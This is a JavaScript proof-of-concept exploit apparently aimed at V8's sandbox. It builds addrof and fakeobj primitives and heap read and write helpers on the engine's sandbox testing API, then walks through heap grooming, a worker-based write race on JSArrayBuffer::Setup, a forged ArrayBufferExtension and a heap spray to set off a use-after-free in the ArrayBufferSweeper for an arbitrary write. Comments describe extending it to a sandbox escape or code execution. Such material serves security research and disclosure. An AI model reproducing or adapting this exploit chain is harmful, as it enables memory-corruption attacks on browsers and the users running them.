//Provides a common set of heap primitives using the memory corruption API
var SANDBOX_BASE = Sandbox.base;

let heap_view = new DataView(new Sandbox.MemoryView(0, 0x100000000));
addrof = function addrof(obj) {
    return Sandbox.getAddressOf(obj) & ~1;
};
fakeobj = function fakeobj(addr) {
    return Sandbox.getObjectAt(addr & ~1);
};
hread32 = function hread32(addr) {
    return heap_view.getUint32(addr, true);
};
hwrite32 = function hwrite32(addr, val) {
    heap_view.setUint32(addr, val, true);
};
hread64 = function hread64(addr) {
    return heap_view.getBigUint64(addr, true);
};
hwrite64 = function hwrite64(addr, val) {
    heap_view.setBigUint64(addr, val, true);
};

//Utilities for later
function spin(ms) {
    let end = Date.now() + ms;
    while(Date.now() < end);
}

function buffer_data_ptr(buf) {
    return Number(hread64(addrof(buf) + 36) >> BigInt(24));
}

function start_worker(src) {
    return new Worker(src, { type: "string" });
}

function start_worker_func(func, ...args) {
    function stringify(val) {
        if(typeof val == "function") {
            //Dump the source code of the function / class
            return val.toString();
        } else if(Array.isArray(val)) {
            //Support arrays of functions / classes
            return `[${val.map(stringify).join(", ")}]`;
        } else if(typeof val == "bigint") {
            return `${val}n`;
        } else {
            return JSON.stringify(val);
        }
    }

    return start_worker(`(${func})(${args.map(stringify).join(", ")})`);
}

class ControlledWorker {
    control_buf;
    control32;
    control64;
    status;

    worker_scope = null;

    get is_worker() { return this.worker_scope != null; }
    get should_run() { return this.status[0xfff] == 0; }

    constructor(is_worker = false) {
        if(is_worker) {
            this.worker_scope = new Function("return this")();
            return;
        }

        console.log(`Starting worker of type ${new.target.name}`);

        //Create a control buffer
        this.control_buf = new SharedArrayBuffer(0x3000);

        this.control32 = new Uint32Array(this.control_buf, 0x0000);
        this.control64 = new BigUint64Array(this.control_buf, 0x1000);
        this.status = new Uint8Array(this.control_buf, 0x2000);

        //Start the worker
        let declrs = [];
        for(let cls = new.target; cls != ControlledWorker; cls = cls.__proto__) declrs.unshift(cls.__proto__);

        this.worker = start_worker_func(declrs, "ControlledWorker.worker_entry", new.target);

        //Send the control buffer over to the worker
        this.worker.postMessage(this.control_buf);
    }

    static worker_entry(cls) {
        //Create our own worker class instance
        let worker = new cls(true);
        worker.init_worker().then(() => worker.run_worker()).then(() => worker.status[0xfff] = 2);
    }

    async init_worker() {
        //Receive the control buffer
        this.control_buf = await this.recv_msg();
        this.control32 = new Uint32Array(this.control_buf, 0x0000);
        this.control64 = new BigUint64Array(this.control_buf, 0x1000);
        this.status = new Uint8Array(this.control_buf, 0x2000);
    }

    run_worker() {
        throw new Error("run_worker wasn't implemented");
    }

    recv_msg() {
        if(!this.is_worker) throw new Error("recv_msg can only be called from the worker");
        return new Promise((resolve, _) => {
            this.worker_scope.onmessage = ev => {
                this.worker_scope.onmessage = null;
                resolve(ev.data);
            };
        });
    }

    terminate() {
        this.status[0xfff] = 1;
        while(this.status[0xfff] != 2);
        this.worker.terminate();
    }
}

class WriteHammer {
    constructor() {
        //Create a control buffer
        this.control_buf = new SharedArrayBuffer(0x2000);
        this.control = new Uint32Array(this.control_buf, 0x0000);
        this.status = new Uint8Array(this.control_buf, 0x1000);

        //Start the worker
        this.worker = start_worker_func(`${WriteHammer}.run_worker`, new.target);

        //Send the control buffer over to the worker
        this.worker.postMessage(this.control_buf);
    }

    write_to(addr, val) {
        if(this.control[0] != 0) this.stop();

        this.control[1] = val;
        this.control[0] = addr;
        while(this.status[0] != 1);

        spin(10); // - give the worker a bit to properly start hammering the address
    }

    stop() {
        this.control[0] = 0;
        while(this.status[0] != 0);
    }

    static run_worker() {
        let heap_view = new Sandbox.MemoryView(0, 0x100000000);

        //Receive the control buffer
        let self = new Function("return this;")();
        self.onmessage = ev => {
            self.onmessage = null;

            let control_buf = ev.data;
            let control = new Uint32Array(control_buf, 0x0000);
            let status = new Uint8Array(control_buf, 0x1000);

            while(true) {
                //Wait until we get an address to hammer
                while(!control[0]);

                //Hammer the address until we should stop
                let addr = control[0];
                let val = control[1];
                let arr = new Uint32Array(heap_view, addr, 4);

                status[0] = 1;
                while(control[0]) arr[0] = val;
                status[0] = 0;
            }
        };
    }
}


/* ############################################################ START OF THE ACTUAL EXPLOIT ############################################################ */


//Prepare a fake ArrayBufferExtension; the ArrayBufferSweeper will later visit this exactly like any ordinary extension
//This can ultimately be used escape the sandbox / obtain RCE by obtaining a fake BackingStore within the confines of the sandbox
//(such a BackingStore can be obtained by using an arbitrary free to poison glibc malloc caches to allocate the next instance of the BackingStore class within the confines of the sandbox)
//
//However, to demonstrate our control, we'll simply write to an attacker-controlled address by setting a fake `owning_table_` pointer, which we'll point to a fake ExternalPointerTable
//Once the fake ArrayBufferExtension gets freed, it will try to zap an entry in this table, which gives us an arbitrary write
const TARGET = 0x13371337000n;

let fake_ext_buf = new ArrayBuffer(0x1000);
let fake_ext_addr = BigInt(Sandbox.base + buffer_data_ptr(fake_ext_buf));
console.log(`Fake ArrayBufferExtension addr: 0x${fake_ext_addr.toString(16)}`);

let fake_ext_data = new DataView(fake_ext_buf);
fake_ext_data.setBigUint64(0x000, fake_ext_addr + 0x800n, true);    //ExternalPointerTable::ManagedResource::owning_table_
fake_ext_data.setUint32(0x008, 1, true);                            //ExternalPointerTable::ManagedResource::ept_entry_
fake_ext_data.setBigUint64(0x800, TARGET, true);                    //SegmentedTable::base_

//Prepare the spray ahead-of-time
let spray_buf = new ArrayBuffer(0x1000);

let spray_fill = new BigUint64Array(2);
spray_fill[0] = fake_ext_addr;
spray_fill[1] = 0xffffffffffffffffn; // - ensure marked_ is set so that the victim extension isn't freed again

// - we have to align our spray to the next 0x10 boundary, so we need to know how many bytes are before our spray payload
const SERIALIZATION_OVERHEAD = 3 + Math.ceil(Math.log2(spray_buf.byteLength) / 7);

let spray_view = new DataView(spray_buf);
for(let off = 0x10 - SERIALIZATION_OVERHEAD; off + 0x10 <= spray_buf.byteLength; off += 0x10) {
    spray_view.setBigUint64(off + 0, spray_fill[0], true);
    spray_view.setBigUint64(off + 8, spray_fill[1], true);
}

//Allocate a whole lot of array buffers to fill any holes in the heap
console.log("Preparing heap");

let _fill_bufs = [];
for(let i = 0; i < 0x100000; i++) _fill_bufs[i] = new ArrayBuffer(0x10);

gc({ type: "major" });
spin(1000); // - give ArrayBufferSweeper some time to run

//Allocate a victim ArrayBufferExtension which we'll target
//The heap layout we want is very precise; we want the victim extension to be sandwiched between two large free chunks of memory, this way it will become part of a large area of free memory once freed
//To achieve this, we allocate a bunch of ArrayBufferExtensions in a row, and only keep the middle one
let bufs = [];
for(let i = 0; i < 0x80000; i++) bufs[i] = new ArrayBuffer(0x100);

function spray() {
    gc({ type: "minor" });
    console.log("Spraying ArrayBufferExtensions for target heap layout");
    for(let i = 0; i < bufs.length; i++) bufs[i] = bufs[i].transfer();
    console.log(" - done");
}

//We warm up the spray method a bit to ensure we avoid any unnecessary allocations 
for(let i = 0; i < 10; i++) spray();

//Now that we allocated our target extensions, we can grab our victim extension and free the rest
console.log("Finalizing layout spray");

let victim_buf = bufs[bufs.length / 2];
bufs = null;

gc({ type: "major" });
spin(1000); // - give ArrayBufferSweeper some time to run

//Read the victim extension's handle
let victim_ext = hread32(addrof(victim_buf) + 0x2c);
console.log(`Victim ArrayBufferExtension handle: 0x${victim_ext.toString(16)}`);

//Prepare for the following section of the exploit
//During it, we must not trigger any GCs to not mess up the final step, so we allocate as much as possible in advance
//We then flush the young generation, to give us as much time until memory runs out as we can get
let hammer = new WriteHammer();
gc({ type: "minor" });

//Allocate some sacrifical ArrayBufferExtensions
//The purpose of these extensions is to be freed alongside the victim extension, filling any allocator caches so that the victim extension's memory doesn't get immediately reused
console.log("Allocating sacrificial ArrayBufferExtensions");
for(let i = 0; i < 0x20000; i++) spray_buf = spray_buf.transfer();
console.log(" - done");

//Allocate a heap-backed TypedArray, and obtain the address of its associated ArrayBuffer before it is initalized 
let pwn_arr = new Uint8Array(0x21);
pwn_arr[0] = 0x21;

let addr_pwn_arr_buf = hread32(addrof(pwn_arr) + 0x10) & ~1;
console.log(`TypedArray ArrayBuffer addr: 0x${addr_pwn_arr_buf.toString(16)}`);
if(hread32(addr_pwn_arr_buf + 0x2c) != 0) throw new Error("TypedArray ArrayBufferExtension isn't null");

//Initialize the typed array's ArrayBuffer; this will call JSArrayBuffer::Setup, which will allocate a new ArrayBufferExtension, and use register it with the ArrayBufferSweeper later down the line
//We try to overwrite the extension handle during this window of time after the allocation of the array buffer extension, but before its registration
//If we win this race, this will insert ArrayBufferExtension into the young generation as well, effectively making it part of both generations
hammer.write_to(addr_pwn_arr_buf + 0x2c, victim_ext);
pwn_arr.buffer; // - trigger the initialization of the ArrayBuffer
hammer.stop();

//Ensure we won the race
//This check works since if we won the race, the victim ArrayBufferExtension's associated backing_store will have been overwritten, and ArrayBuffer.transfer() reads the byte length from the backing store directly
if(victim_buf.transfer().byteLength != 0x21) throw new Error("didn't win TypedArray race condition");

console.log("Won JSArrayBuffer::Setup race");

//Allocate some more sacrifical ArrayBufferExtensions
console.log("Allocating more sacrificial ArrayBufferExtensions");
for(let i = 0; i < 0x20000; i++) spray_buf = spray_buf.transfer();
console.log(" - done");

//Trigger the ArrayBufferSweeper; ever since we started this process, we should not have ran a GC, which means this sweep will free all sacrifical ArrayBufferExtensions + the victim extension in one go
console.log("Triggering ArrayBufferSweeper");
arr_buf = null;
victim_buf = null;
gc({ type: "minor" });

//Spray the fake ArrayBufferExtension's pointer + metadata on the heap to control the next pointer of the victim ArrayBufferExtension
//We use postMessage with a large ArrayBuffer to copy, since the serialized message data will be put on the heap
console.log("Spraying fake ArrayBufferExtension pointer");
for(let i = 0; i < 0x200000; i++) hammer.worker.postMessage(spray_buf);

//Trigger a major GC; this will trigger the ArrayBufferSweeper to sweep the old generation ArrayBufferExtension list, which contains the victim ArrayBufferExtension whose contents we control
//As such the ArrayBufferSweeper will end up following our sprayed pointer while traversing the free list
console.log("Triggering use-after-free...");
gc({ type: "major" });

spin(1000);
console.log(" - failed :/");

//Dead code to keep some ArrayBuffers alive
_fill_bufs = _fill_bufs.map(b => b.transfer());
fake_ext_buf = fake_ext_buf.transfer();